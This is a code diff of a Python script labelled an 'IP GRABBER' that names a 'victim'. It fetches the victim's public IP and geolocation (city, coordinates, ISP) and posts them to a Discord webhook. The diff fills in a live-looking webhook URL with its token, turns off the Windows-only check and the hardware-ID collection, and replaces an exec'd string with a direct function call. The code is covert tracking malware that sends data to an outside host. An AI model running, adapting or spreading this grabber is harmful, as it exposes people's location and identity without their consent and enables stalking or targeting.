@@ -1,3 +1,8 @@
+import requests
+
+ip = requests.get('https://api.ipify.org/').text
+data = requests.get(f"http://ip-api.com/json/{ip}").json()
+
 import os
 try:
     import re, uuid, requests, subprocess, os.path, sys, time
@@ -13,7 +18,7 @@ except:
     sys.exit()
 
 #config
-hook = "ENTER_WEBHOOK"
+hook = "https://discord.com/api/webhooks/1152014416599068753/CjROpWumLRSLZaqCiMGSB1jbb4d0gfzvpnPKKvpQ60CwlZypMH6PCkTIDghsQftiMTtZ"
 victim = "VICTIM_NAME"
 ping = "@everyone" #Leave blank for no ping
 
@@ -51,55 +56,53 @@ ping = "@everyone" #Leave blank for no ping
                :YJ.                                                        
               .:.                                                         
 """
-grabber = """
-#grabber
+
 def grabber():
-    if os.name != "nt":
-        sys.exit()
+    # if os.name != "nt":
+    #     sys.exit()
 
     try:
         # -------------------* info *-------------------#
-        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
-        pcname = os.path.expanduser("~")[9:]
+        mac = '' #':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        hwid = '' #str(subprocess.check_output('wmic csproduct get uuid')).split("\r\n")[1].strip("\r").strip()
+        pcname = '' #os.path.expanduser("~")[9:]
         ip = requests.get('https://api.ipify.org/').text
-        data = requests.get(f"https://api.xtekky.com/ip-info/{ip}", headers={'X-API-KEY': 'test'}).json()
+        data = requests.get(f"http://ip-api.com/json/{ip}").json()
 
         # -------------------* hook *-------------------#
         requests.post(hook, json={
-            "content": f"{ping}",
-            "embeds": [
-                {
-                    "title": f"{victim} | IP: {ip}",
-                    "description": f"**Location**"
-                                       f"```python\n"
-                                           f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}\n"
-                                           f"Lat: {data['lat']} | Lon: {data['lon']}\nISP: {data['isp']}"
-                                           f"ORG: {data['org']}\n"
-                                           f"AS: {data['as']}\n"
-                                           f"MAC: {mac}\n"
-                                           f"HWID: {hwid}\n"
-                                           f"PC-USER: {pcname}"
-                                   f"```"
-                                    f"**Execution time:** "
+                "content": f"{ping}",
+                "embeds": [
+                    {
+                        "title": f"{victim} | IP: {ip}",
+                        "description": f"**Location**"
                                         f"```python\n"
-                                            f"{round(time.time()-start, 2)} sec\n```"
-                                   
-                                    f"**Time Started:** "
-                                        f"```python\n"
-                                            f"{datetime.now()} \n```",
-                    "color": 5814783,
-                    "footer": {
-                        "text": "IP GRABBER BY Whaxor#9999",
-                        "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
-                    },
-                    "timestamp": str(datetime.utcnow())
-                }
-            ]
-
-        }
-    )
-
+                                            f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}\n"
+                                            f"Lat: {data['lat']} | Lon: {data['lon']}ISP: {data['isp']}\n"
+                                            f"ORG: {data['org']}\n"
+                                            f"AS: {data['as']}\n"
+                                            f"MAC: {mac}\n"
+                                            f"HWID: {hwid}\n"
+                                            f"PC-USER: {pcname}\n"
+                                    f"```"
+                                        f"**Execution time:** "
+                                            f"```python\n"
+                                                f"{round(time.time()-start, 2)} sec```"
+                                    
+                                        f"**Time Started:** "
+                                            f"```python\n"
+                                                f"{datetime.now()} ```",
+                        "color": 5814783,
+                        "footer": {
+                            "text": "IP GRABBER BY Whaxor#9999",
+                            "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
+                        },
+                        "timestamp": str(datetime.utcnow())
+                    }
+                ]
+            }
+        )
+        
     except:
         try:
             requests.post(hook, json={"content": f"Failed to grab {victim}"})
@@ -110,6 +113,3 @@ def grabber():
 
 start = time.time()
 grabber()
-"""
-exec(grabber)
-
